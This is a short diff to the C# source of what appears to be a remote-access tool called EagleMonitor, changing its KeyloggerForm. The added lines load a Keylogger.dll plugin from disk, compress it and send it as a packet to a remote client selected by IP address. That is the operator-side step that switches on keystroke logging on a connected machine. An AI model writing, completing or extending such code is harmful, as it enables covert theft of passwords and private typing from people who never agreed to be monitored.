@@ -21,7 +21,6 @@ namespace EagleMonitor.Forms
 
         internal KeyloggerForm(string baseIp)
         {
-            //this.clientHandler = clientHandler;
             this.baseIp = baseIp;
             InitializeComponent();
         }
@@ -30,6 +29,11 @@ namespace EagleMonitor.Forms
         {
             this.startKeylogGuna2Button.Enabled = false;
             this.startKeylogGuna2Button.Text = "Keylogger already enabled !";
+
+            KeylogPacket keylogPacket = new KeylogPacket();
+            keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
+
+            ClientHandler.ClientHandlersList[this.baseIp].SendPacket(keylogPacket);
         }
 
         private void stopKeylogGuna2Button_Click(object sender, EventArgs e)
